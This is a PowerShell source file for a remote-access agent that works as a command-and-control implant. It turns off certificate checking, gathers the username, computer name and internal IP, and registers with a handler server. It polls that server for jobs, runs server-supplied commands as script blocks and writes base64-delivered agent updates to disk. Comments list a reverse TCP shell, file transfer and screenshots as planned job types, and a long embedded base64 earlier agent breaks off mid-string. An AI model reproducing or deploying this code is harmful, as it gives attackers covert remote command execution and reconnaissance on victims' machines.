function Start-Agent {
    param(
            [Parameter(Mandatory=$true)] $Url,
            [Parameter(Mandatory=$true)] $ServerUser,
            [Parameter(Mandatory=$true)] $ServerPass,
            [Parameter(Mandatory=$true)] $Password
        )

add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@

	
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    function Create-Agent($HandlerUrl, $ServerUser, $ServerPass, $Password)
    {
        $properties = @{
            ID = 0
            Username = "unknown"
            Computer = "unknown"
            Version = "0.01"
            InternalIP = "0.0.0.0"
            ExternalIP = "0.0.0.0"
            HasJobs = 0
            CreatedAt = "unknown"
            CheckedIn = "unknown"
            Registered = 0
            ServerUser = $ServerUser
            ServerPass = $ServerPass
            Password = $Password
            HandlerUrl = $HandlerUrl
            SleepTime = 5000
            CreatedBy = 0
            AgentType = 2
            Killed = 0
            AuthToken = ""
        }

        $object = New-Object -TypeName PSObject -Property $properties

        Add-Member -memberType ScriptMethod -InputObject $object -Name "ServerOnline" -Value {
            # Check to see if server is online
			try {
                
                $response = Invoke-WebRequest -Uri $this.HandlerUrl -Method GET
                $responseobj = $response.Content | ConvertFrom-Json
                if ($responseobj.online -eq 1) {
                    return 1
                } else {
                    return 0
                }
            } 
            catch {
                return 0
            } 
        }   

        Add-Member -memberType ScriptMethod -InputObject $object -Name "Auth" -Value {
            # Check to see if server is online
            try {
                $url = $this.HandlerUrl + "/auth/" + $this.ServerUser + "/" + $this.ServerPass
                $response = Invoke-WebRequest -Uri $url -Method GET
                $responseobj = $response.Content | ConvertFrom-Json
                $this.CreatedBy = $responseobj.id
                $this.AuthToken = $responseobj.auth_token
                return 1
            } 
            catch {
                return 0
            } 
        } 

        Add-Member -memberType ScriptMethod -InputObject $object -Name "CheckAuth" -Value {
            # Check to see if server is online
            try {
                $url = $this.HandlerUrl + "/tokens/" + $this.AuthToken
                $response = Invoke-WebRequest -Uri $url -Method GET
                $responseobj = $response.Content | ConvertFrom-Json
                if ($responseobj.id -gt 0) {
                    return 1
                } else {
                    return 0
                }
            } 
            catch {
                return 0
            } 
        } 

        Add-Member -memberType ScriptMethod -InputObject $object -Name "CheckIn" -Value {
            # Get Agent Detials From Server To Check If Jobs etc
			try {
                $url = $this.HandlerUrl + "/agents/" + $this.AuthToken + "/" + $this.ID
                $response = Invoke-WebRequest -Uri $url -Method GET
                $responseobj = $response.Content | ConvertFrom-Json
                if ($responseobj.id -eq $this.ID){
                    $this.HasJobs = $responseobj.has_jobs
                    $this.Registered = $responseobj.registered
                    $this.HandlerUrl = $responseobj.handler_url
                    $this.SleepTime = $responseobj.sleep_time_ms
                    $this.Killed = $responseobj.killed
                    return 1
                } else {
                    return 0
                }
            } 
            catch {
                return 0
            } 
        } 

        Add-Member -memberType ScriptMethod -InputObject $object -Name "Register" -Value {
			try {
                $postparams = @{
                    id = $this.ID
                    username = $this.Username
                    computer = $this.Computer
                    version = $this.Version
                    internal_ip = $this.InternalIP
                    external_ip = $this.ExternalIP
                    has_jobs = $this.HasJobs
                    registered = $this.Registered
                    password = $this.Password
                    handler_url = $this.HandlerUrl
                    sleep_time_ms = $this.SleepTime
                    created_by = $this.CreatedBy
                    agent_type = $this.AgentType
                    killed = $this.Killed
                    auth_token = $this.AuthToken
                }
                $posturl = $this.HandlerUrl + "/agents"
                $response = Invoke-WebRequest -Uri $posturl -Method POST -Body $postParams
                $responseobj = $response.Content | ConvertFrom-Json

                if ($responseobj.agentId -And $responseobj.agentId -gt 0) {
                    $this.ID = $responseobj.agentId
                    $this.registered = 1
                    return 1 # Returns 1 but not needed to be viewed atm
                } else {
                    $this.registered = 0
                    return 0
                } 
            } 
            catch {
                Start-Sleep -milliseconds 300
                $this.registered = 0
                return 0
            }
        }  

        Add-Member -memberType ScriptMethod -InputObject $object -Name "Update" -Value {
			try {
                $postparams = @{
                    id = $this.ID
                    username = $this.Username
                    computer = $this.Computer
                    version = $this.Version
                    internal_ip = $this.InternalIP
                    external_ip = $this.ExternalIP
                    has_jobs = $this.HasJobs
                    registered = $this.Registered
                    password = $this.Password
                    handler_url = $this.HandlerUrl
                    sleep_time_ms = $this.SleepTime
                    created_by = $this.CreatedBy
                    agent_type = $this.AgentType
                    killed = $this.Killed
                    auth_token = $this.AuthToken
                }
                $json = $postparams | ConvertTo-Json;
                $contentType = "application/json"
                $posturl = $this.HandlerUrl + "/agents/" + $this.ID
                $response = Invoke-WebRequest -Uri $posturl -Method PUT -ContentType $contentType -Body $json
                $responseobj = $response.Content | ConvertFrom-Json
                return 1
            } 
            catch {
                Start-Sleep -milliseconds 300
                return 0
            }
        }  

        Add-Member -memberType ScriptMethod -InputObject $object -Name "GtSysDts" -Value {
            try {
                $this.InternalIP = (
                    Get-NetIPConfiguration |
                    Where-Object {
                        $_.IPv4DefaultGateway -ne $null -and
                        $_.NetAdapter.Status -ne "Disconnected"
                    }
                ).IPv4Address.IPAddress
                $this.Username = $env:UserName
                $this.Computer = $env:ComputerName
                return 1
            }
            catch {
                return 0
            }
        } 

        Add-Member -memberType ScriptMethod -InputObject $object -Name "GetJobs" -Value {
            # Check to see if server is online
			try {
                $url = $this.HandlerUrl + "/jobs/new/agent/" + $this.AuthToken + "/" + $this.ID
                $response = Invoke-WebRequest -Uri $url -Method GET
                $responseobj = $response.Content | ConvertFrom-Json
                if ($responseobj.Count -gt 0) {
                    $responseobj
                    return $responseobj
                } else {
                    return 0
                }
            } 
            catch {
                return 0
            } 
        }  



        return $object
    }

##################################### JOB OBJECT

    function Create-Job($JobID, $AgentID, $JobType, $HandlerUrl, $Command, $AuthToken)
    {
        $properties = @{
            ID = $JobID
            AgentID = $AgentID
            JobType = $JobType
            HandlerUrl = $HandlerUrl
            Command = $Command
            CommandResponse = "No Response"
            Complete = 0
            AuthToken = $AuthToken
        }

        $object = New-Object -TypeName PSObject -Property $properties

        Add-Member -memberType ScriptMethod -InputObject $object -Name "Run" -Value {
            # JOB TYPES:
            # 1 Run Command
            # 2 Download File
            # 3 Upload File
            # 4 Reverse TCP Shell
            # 5 Take Screenshot
            # 6 Upgrade Agent
            
            switch ($this.JobType) {
                1       {$this.JobType1(); break}
                2       {"We found a pear"; break}
                3       {"We found an orange"; break}
                4       {"We found a peach"; break}
                5       {"We found a banana"; break}
                6       {$this.JobType6(); break}
                default {return 0; break}
            }
        }


        Add-Member -memberType ScriptMethod -InputObject $object -Name "JobType1" -Value {
            # Run Command
            "IN JOB TYPE 1"
            try {
                $jobC = $this.Command
                $NewSB = [scriptblock]::Create("$jobC")
                Start-Job -Name $this.JobID -ScriptBlock $NewSB
                $l = 1
                $counter = 0
                while($l -eq 1)
                {
                    if((Get-Job -Name $this.JobID).State -eq "Completed")
                    {
                        $this.CR = Receive-Job -Name $this.JobID | Out-String
                        $l = 0
                    }
                    else
                    {
                        $counter += 1
                        Start-Sleep -milliseconds 5000
                        if($counter -eq 5)
                        {
                            $l = 0
                        }
                    }
                }
            } 
            catch {
                $this.CommandResponse = "No Command Response"
            } 
        }


        Add-Member -memberType ScriptMethod -InputObject $object -Name "JobType6" -Value {
            # Update Agent:
            # 0 Unknown
            # 1 Windows C#
            # 2 Powershell
            # 3 Python
            # 4 Kotlin
            # 5 Java
            "IN JOB TYPE 6"
            try {
                $update_object = $this.Command | ConvertFrom-Json # In the update option the command should be a json repsonse with the file etc
                $agent_type = $update_object.agent_type
                if ($agent_type -eq 2) {
                    # Type 2 is Powershell so ascii text is being recieved as the file                
                    $update_file_b64 = $update_object.agent_b64;
                    $update_file_data = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($update_file_b64));

                    $time=[Math]::Floor([decimal](Get-Date(Get-Date).ToUniversalTime()-uformat "%s"))
                    
                    Set-Content -Path "oc_agnt_$time.ps1" -Value $update_file_data;

                    $this.CommandResponse = "Agent Succesfully Uploaded to Current Agents Directory"
                } 
            } 
            catch {
                $this.CommandResponse = "Failed to Update Agent"
            } 
        }


        return $object
    }


######################################### MAIN


    $agent = Create-Agent -Password $Password -HandlerUrl $Url -ServerUser $ServerUser -ServerPass $ServerPass
    



    # $j = Create-Job -JobID 1 -AgentID 1 -JobType 6 -HandlerUrl $agent.HandlerUrl -Command '{"id":"1","agent_type":"2","agent_version":"0.02","agent_owner":"1","agent_b64":"ZnVuY3Rpb24gU3RhcnQtQWdlbnQgew0KICAgIHBhcmFtKA0KICAgICAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUpXSAkVXJsLA0KICAgICAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUpXSAkS2V5DQogICAgICAgICkNCg0KYWRkLXR5cGUgQCINCiAgICB1c2luZyBTeXN0ZW0uTmV0Ow0KICAgIHVzaW5nIFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuWDUwOUNlcnRpZmljYXRlczsNCiAgICBwdWJsaWMgY2xhc3MgVHJ1c3RBbGxDZXJ0c1BvbGljeSA6IElDZXJ0aWZpY2F0ZVBvbGljeSB7DQogICAgICAgIHB1YmxpYyBib29sIENoZWNrVmFsaWRhdGlvblJlc3VsdCgNCiAgICAgICAgICAgIFNlcnZpY2VQb2ludCBzcnZQb2ludCwgWDUwOUNlcnRpZmljYXRlIGNlcnRpZmljYXRlLA0KICAgICAgICAgICAgV2ViUmVxdWVzdCByZXF1ZXN0LCBpbnQgY2VydGlmaWNhdGVQcm9ibGVtKSB7DQogICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgfQ0KICAgIH0NCiJADQoNCgkNCltTeXN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpDZXJ0aWZpY2F0ZVBvbGljeSA9IE5ldy1PYmplY3QgVHJ1c3RBbGxDZXJ0c1BvbGljeQ0KW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMg0KDQogICAgZnVuY3Rpb24gQ3JlYXRlLUFnZW50KCRIYW5kbGVyVXJsLCAkQXBpS2V5KQ0KICAgIHsNCiAgICAgICAgJHByb3BlcnRpZXMgPSBAew0KICAgICAgICAgICAgSUQgPSAiMCINCiAgICAgICAgICAgIEludGVybmFsSVAgPSAiMC4wLjAuMCINCiAgICAgICAgICAgIEV4dGVybmFsSVAgPSAiMC4wLjAuMCINCiAgICAgICAgICAgIFVzZXIgPSAidW5rbm93biINCiAgICAgICAgICAgIENvbXB1dGVyTmFtZSA9ICJ1bmtub3duIg0KICAgICAgICAgICAgU3RhdHVzID0gInNsZWVwIg0KICAgICAgICAgICAgQ3JlYXRlZEF0ID0gInVua25vd24iDQogICAgICAgICAgICBDaGVja2VkSW4gPSAidW5rbm93biINCiAgICAgICAgICAgIFJlZ2lzdGVyZWQgPSAiZmFsc2UiDQogICAgICAgICAgICBLaWxsZWQgPSAiZmFsc2UiDQogICAgICAgICAgICBTbGVlcFRpbWUgPSAiNTAwMDAiDQogICAgICAgICAgICBBcGlLZXkgPSAkQXBpS2V5DQogICAgICAgICAgICBIYW5kbGVyVXJsID0gJEhhbmRsZXJVcmwNCiAgICAgICAgfQ0KDQogICAgICAgICRvYmplY3QgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAtUHJvcGVydHkgJHByb3BlcnRpZXMNCg0KICAgICAgICBBZGQtTWVtYmVyIC1tZW1iZXJUeXBlIFNjcmlwdE1ldGhvZCAtSW5wdXRPYmplY3QgJG9iamVjdCAtTmFtZSAiU2xwIiAtVmFsdWUgew0KICAgICAgICAgICAgU3RhcnQtU2xlZXAgLW1pbGxpc2Vjb25kcyAkdGhpcy5TbGVlcFRpbWUNCiAgICAgICAgfQ0KDQogICAgICAgIEFkZC1NZW1iZXIgLW1lbWJlclR5cGUgU2NyaXB0TWV0aG9kIC1JbnB1dE9iamVjdCAkb2JqZWN0IC1OYW1lICJVU0kiIC1WYWx1ZSB7DQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgICR0aGlzLkludGVybmFsSVAgPSAoDQogICAgICAgICAgICAgICAgICAgIEdldC1OZXRJUENvbmZpZ3VyYXRpb24gfA0KICAgICAgICAgICAgICAgICAgICBXaGVyZS1PYmplY3Qgew0KICAgICAgICAgICAgICAgICAgICAgICAgJF8uSVB2NERlZmF1bHRHYXRld2F5IC1uZSAkbnVsbCAtYW5kDQogICAgICAgICAgICAgICAgICAgICAgICAkXy5OZXRBZGFwdGVyLlN0YXR1cyAtbmUgIkRpc2Nvbm5lY3RlZCINCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICkuSVB2NEFkZHJlc3MuSVBBZGRyZXNzDQogICAgICAgICAgICAgICAgJHRoaXMuVXNlciA9ICRlbnY6VXNlck5hbWUNCiAgICAgICAgICAgICAgICAkdGhpcy5Db21wdXRlck5hbWUgPSAkZW52OkNvbXB1dGVyTmFtZQ0KICAgICAgICAgICAgICAgIHJldHVybiAidHJ1ZSINCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoIHsNCiAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtbWlsbGlzZWNvbmRzIDEwMDAwDQogICAgICAgICAgICAgICAgcmV0dXJuICJmYWxzZSINCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIEFkZC1NZW1iZXIgLW1lbWJlclR5cGUgU2NyaXB0TWV0aG9kIC1JbnB1dE9iamVjdCAkb2JqZWN0IC1OYW1lICJHZXRKb2JJRHMiIC1WYWx1ZSB7DQogICAgICAgICAgICB0cnl7DQogICAgICAgICAgICAgICAgJHBvc3RwYXJhbXMgPSBAew0KICAgICAgICAgICAgICAgICAgICBhcGlfa2V5PSAkdGhpcy5BcGlLZXkNCiAgICAgICAgICAgICAgICAgICAgYWdlbnRfaWQgPSAkdGhpcy5JRA0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAkcG9zdHVybCA9ICR0aGlzLkhhbmRsZXJVcmwgKyAiZ2V0am9iaWRzLnBocCINCiAgICAgICAgICAgICAgICAkcmVzcG9uc2UgPSBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICRwb3N0dXJsIC1NZXRob2QgUE9TVCAtQm9keSAkcG9zdFBhcmFtcw0KICAgICAgICAgICAgICAgIGlmICgkcmVzcG9uc2UuQ29udGVudCAtZXEgImZhbHNlIikNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiAiZmFsc2UiDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICRyZXNwb25zZW9iaiA9ICRyZXNwb25zZS5Db250ZW50IHwgQ29udmVydEZyb20tSnNvbg0KICAgICAgICAgICAgICAgIHJldHVybiAkcmVzcG9uc2VvYmoNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoew0KICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1taWxsaXNlY29uZHMgMTAwMDANCiAgICAgICAgICAgICAgICByZXR1cm4gImZhbHNlIg0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgIH0NCg0KICAgICAgICBBZGQtTWVtYmVyIC1tZW1iZXJUeXBlIFNjcmlwdE1ldGhvZCAtSW5wdXRPYmplY3QgJG9iamVjdCAtTmFtZSAiUmVzZXRBZ2VudCIgLVZhbHVlIHsNCiAgICAgICAgICAgICR0aGlzLklEID0gIjAiDQogICAgICAgICAgICAkdGhpcy5JbnRlcm5hbElQID0gIjAuMC4wLjAiDQogICAgICAgICAgICAkdGhpcy5FeHRlcm5hbElQID0gIjAuMC4wLjAiDQogICAgICAgICAgICAkdGhpcy5Vc2VyID0gInVua25vd24iDQogICAgICAgICAgICAkdGhpcy5Db21wdXRlck5hbWUgPSAidW5rbm93biINCiAgICAgICAgICAgICR0aGlzLlJlZ2lzdGVyZWQgPSAiZmFsc2UiDQogICAgICAgIH0NCg0KICAgICAgICBBZGQtTWVtYmVyIC1tZW1iZXJUeXBlIFNjcmlwdE1ldGhvZCAtSW5wdXRPYmplY3QgJG9iamVjdCAtTmFtZSAiQ2hlY2tJbiIgLVZhbHVlIHsNCgkJCXRyeSB7DQogICAgICAgICAgICAgICAgJHBvc3RwYXJhbXMgPSBAew0KICAgICAgICAgICAgICAgICAgICBhcGlfa2V5PSAkdGhpcy5BcGlLZXkNCiAgICAgICAgICAgICAgICAgICAgaWQgPSAkdGhpcy5JRA0KICAgICAgICAgICAgICAgICAgICBpbnRlcm5hbF9pcCA9ICR0aGlzLkludGVybmFsSVANCiAgICAgICAgICAgICAgICAgICAgZXh0ZXJuYWxfaXAgPSAkdGhpcy5FeHRlcm5hbElQDQogICAgICAgICAgICAgICAgICAgIHVzZXIgPSAkdGhpcy5Vc2VyDQogICAgICAgICAgICAgICAgICAgIGNvbXB1dGVyX25hbWUgPSAkdGhpcy5Db21wdXRlck5hbWUNCiAgICAgICAgICAgICAgICAgICAgc3RhdHVzID0gJHRoaXMuU3RhdHVzDQogICAgICAgICAgICAgICAgICAgIGNoZWNrZWRfaW4gPSAkdGhpcy5DaGVja2VkSW4NCiAgICAgICAgICAgICAgICAgICAgcmVnaXN0ZXJlZCA9ICR0aGlzLlJlZ2lzdGVyZWQNCiAgICAgICAgICAgICAgICAgICAgaGFuZGxlcl91cmwgPSAkdGhpcy5IYW5kbGVyVXJsDQogICAgICAgICAgICAgICAgICAgIHNsZWVwX3RpbWUgPSAkdGhpcy5TbGVlcFRpbWUNCiAgICAgICAgICAgICAgICAgICAga2lsbGVkID0gJHRoaXMuS2lsbGVkDQogICAgICAgICAgICAgICAgfQ0KCQkJCQ0KCQkJCQ0KCQkJCQ0KCQkJCQ0KICAgICAgICAgICAgICAgICRwb3N0dXJsID0gJHRoaXMuSGFuZGxlclVybCArICJjaGVja2luLnBocCINCgkJCQkNCgkJCQkNCiAgICAgICAgICAgICAgICAkcmVzcG9uc2UgPSBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICRwb3N0dXJsIC1NZXRob2QgUE9TVCAtQm9keSAkcG9zdFBhcmFtcw0KCQkJCQ0KICAgICAgICAgICAgICAgICRyZXNwb25zZW9iaiA9ICRyZXNwb25zZS5Db250ZW50IHwgQ29udmVydEZyb20tSnNvbg0KCQkJCQ0KICAgICAgICAgICAgICAgIGlmKCEkcmVzcG9uc2VvYmouaWQpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtbWlsbGlzZWNvbmRzIDEwMDAwDQogICAgICAgICAgICAgICAgICAgICR0aGlzLlJlc2V0QWdlbnQoKQ0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gImZhbHNlIg0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlew0KICAgICAgICAgICAgICAgICAgICAkdGhpcy5JRCA9ICRyZXNwb25zZW9iai5pZA0KICAgICAgICAgICAgICAgICAgICAkdGhpcy5JbnRlcm5hbElQID0gJHJlc3BvbnNlb2JqLmludGVybmFsX2lwDQogICAgICAgICAgICAgICAgICAgICR0aGlzLlN0YXR1cyA9ICRyZXNwb25zZW9iai5zdGF0dXMNCiAgICAgICAgICAgICAgICAgICAgJHRoaXMuQ3JlYXRlZEF0ID0gJHJlc3BvbnNlb2JqLmNyZWF0ZWRfYXQNCiAgICAgICAgICAgICAgICAgICAgJHRoaXMuUmVnaXN0ZXJlZCA9ICRyZXNwb25zZW9iai5yZWdpc3RlcmVkDQogICAgICAgICAgICAgICAgICAgICR0aGlzLlNsZWVwVGltZSA9ICRyZXNwb25zZW9iai5zbGVlcF90aW1lDQogICAgICAgICAgICAgICAgICAgIGlmKCRyZXNwb25zZW9iai5raWxsZWQgLWVxIDApDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLktpbGxlZCA9ICJmYWxzZSINCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLktpbGxlZCA9ICJ0cnVlIg0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIHJldHVybiAidHJ1ZSINCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9IA0KICAgICAgICAgICAgY2F0Y2ggew0KICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1taWxsaXNlY29uZHMgMTAwMDANCiAgICAgICAgICAgICAgICByZXR1cm4gImZhbHNlIDMiDQogICAgICAgICAgICB9IA0KICAgICAgICB9ICAgDQoNCiAgICAgICAgcmV0dXJuICRvYmplY3QNCiAgICB9DQoNCiAgICBmdW5jdGlvbiBDcmVhdGUtSm9iKCRIYW5kbGVyVXJsLCAkQXBpS2V5LCAkSm9iSUQsICRBZ2VudElEKQ0KICAgIHsNCiAgICAgICAgJHByb3BlcnRpZXMgPSBAew0KICAgICAgICAgICAgSm9iSUQgPSAkSm9iSUQNCiAgICAgICAgICAgIEFnZW50SUQgPSAkQWdlbnRJRA0KICAgICAgICAgICAgQXBpS2V5ID0gJEFwaUtleQ0KICAgICAgICAgICAgSGFuZGxlclVybCA9ICRIYW5kbGVyVXJsDQogICAgICAgICAgICBDID0gIm5vbmUiDQogICAgICAgICAgICBDUiA9ICJub25lIg0KICAgICAgICAgICAgQ29tcGxldGUgPSAiMCINCiAgICAgICAgICAgIEZldGNoZWQgPSAiMCINCiAgICAgICAgfQ0KDQogICAgICAgICRvYmplY3QgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAtUHJvcGVydHkgJHByb3BlcnRpZXMNCg0KICAgICAgICBBZGQtTWVtYmVyIC1tZW1iZXJUeXBlIFNjcmlwdE1ldGhvZCAtSW5wdXRPYmplY3QgJG9iamVjdCAtTmFtZSAiR0pCSSIgLVZhbHVlIHsNCiAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgJHBvc3RwYXJhbXMgPSBAew0KICAgICAgICAgICAgICAgICAgICBhcGlfa2V5ID0gJHRoaXMuQXBpS2V5DQogICAgICAgICAgICAgICAgICAgIGFnZW50X2lkID0gJHRoaXMuQWdlbnRJRA0KICAgICAgICAgICAgICAgICAgICBqb2JfaWQgPSAkdGhpcy5Kb2JJRA0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAkcG9zdHVybCA9ICR0aGlzLkhhbmRsZXJVcmwgKyAiZ2V0am9iYnlpZC5waHAiDQogICAgICAgICAgICAgICAgJHJlc3BvbnNlID0gSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkcG9zdHVybCAtTWV0aG9kIFBPU1QgLUJvZHkgJHBvc3RQYXJhbXMNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAkcmVzcG9uc2VvYmogPSAkcmVzcG9uc2UuQ29udGVudCB8IENvbnZlcnRGcm9tLUpzb24NCiAgICANCiAgICAgICAgICAgICAgICAkdGhpcy5DPSAkcmVzcG9uc2VvYmouY29tbWFuZA0KICAgICAgICAgICAgICAgICR0aGlzLkZldGNoZWQgPSAiMSINCg0KICAgICAgICAgICAgICAgIHJldHVybiAidHJ1ZSINCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoIHsNCiAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtbWlsbGlzZWNvbmRzIDEwMDAwDQogICAgICAgICAgICAgICAgcmV0dXJuICJmYWxzZSINCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIEFkZC1NZW1iZXIgLW1lbWJlclR5cGUgU2NyaXB0TWV0aG9kIC1JbnB1dE9iamVjdCAkb2JqZWN0IC1OYW1lICJSbkMiIC1WYWx1ZSB7DQogICAgICAgICAgICB0cnl7DQogICAgICAgICAgICAgICAgJGpvYkMgPSAkdGhpcy5DDQogICAgICAgICAgICAgICAgJE5ld1NCID0gW3NjcmlwdGJsb2NrXTo6Q3JlYXRlKCIkam9iQyIpDQogICAgICAgICAgICAgICAgU3RhcnQtSm9iIC1OYW1lICR0aGlzLkpvYklEIC1TY3JpcHRCbG9jayAkTmV3U0INCiAgICAgICAgICAgICAgICAkbCA9IDENCiAgICAgICAgICAgICAgICAkY291bnRlciA9IDANCiAgICAgICAgICAgICAgICB3aGlsZSgkbCAtZXEgMSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGlmKChHZXQtSm9iIC1OYW1lICR0aGlzLkpvYklEKS5TdGF0ZSAtZXEgIkNvbXBsZXRlZCIpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLkNSID0gUmVjZWl2ZS1Kb2IgLU5hbWUgJHRoaXMuSm9iSUQgfCBPdXQtU3RyaW5nDQogICAgICAgICAgICAgICAgICAgICAgICAkbCA9IDANCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRjb3VudGVyICs9IDENCiAgICAgICAgICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1taWxsaXNlY29uZHMgNTAwMA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGNvdW50ZXIgLWVxIDUpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGwgPSAwDQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcmV0dXJuICJ0cnVlIg0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2h7DQogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLW1pbGxpc2Vjb25kcyAxMDAwMA0KICAgICAgICAgICAgICAgIHJldHVybiAiZmFsc2UiDQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgICMkY3IgPSBJRVggJHRoaXMuQyB8IE91dC1TdHJpbmcNCiAgICAgICAgICAgICMkdGhpcy5DUiA9ICRjcg0KICAgICAgICB9DQoNCiAgICAgICAgQWRkLU1lbWJlciAtbWVtYmVyVHlwZSBTY3JpcHRNZXRob2QgLUlucHV0T2JqZWN0ICRvYmplY3QgLU5hbWUgIlNDUiIgLVZhbHVlIHsNCiAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgJHBvc3RwYXJhbXMgPSBAew0KICAgICAgICAgICAgICAgICAgICBhcGlfa2V5ID0gJHRoaXMuQXBpS2V5DQogICAgICAgICAgICAgICAgICAgIGpvYl9pZCA9ICR0aGlzLkpvYklEDQogICAgICAgICAgICAgICAgICAgIGNvbW1hbmRfcmVzcG9uc2UgPSAkdGhpcy5DUi5Ub1N0cmluZygpDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICRwb3N0dXJsID0gJHRoaXMuSGFuZGxlclVybCArICJ1cGRhdGVqb2IucGhwIg0KICAgICAgICAgICAgICAgICRyZXNwb25zZSA9IEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJHBvc3R1cmwgLU1ldGhvZCBQT1NUIC1Cb2R5ICRwb3N0UGFyYW1zDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgJHJlc3BvbnNlb2JqID0gJHJlc3BvbnNlLkNvbnRlbnQgfCBDb252ZXJ0RnJvbS1Kc29uDQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaCB7DQogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLW1pbGxpc2Vjb25kcyAxMDAwMA0KICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICByZXR1cm4gJG9iamVjdA0KICAgIH0NCiAgICANCgkNCgkNCiAgICAkYWdlbnQgPSBDcmVhdGUtQWdlbnQgLUFwaUtleSAkS2V5IC1IYW5kbGVyVXJsICR1cmwNCiAgICANCiAgICB3aGlsZSgkYWdlbnQuS2lsbGVkIC1lcSAiZmFsc2UiKQ0KICAgIHsNCiAgICAgICAgJHVwZGF0ZWQgPSAkYWdlbnQuVVNJKCkNCiAgICAgICAgaWYoJHVwZGF0ZWQgLWVxICJ0cnVlIikNCiAgICAgICAgewkJDQogICAgICAgICAgICAkY2hlY2tlZGluID0gJGFnZW50LkNoZWNrSW4oKQ0KICAgICAgICAgICAgaWYoJGNoZWNrZWRpbiAtZXEgInRydWUiKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICRqb2JJRHMgPSAkYWdlbnQuR2V0Sm9iSURzKCkNCiAgICAgICAgICAgICAgICBpZigkam9iSURzIC1uZSAiZmFsc2UiKXsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICRqb2JzID0gQCgpDQogICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKCRqb2JJRCBpbiAkam9iSURzKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAkam9iID0gQ3JlYXRlLUpvYiAtSGFuZGxlclVybCAkYWdlbnQuSGFuZGxlclVybCAt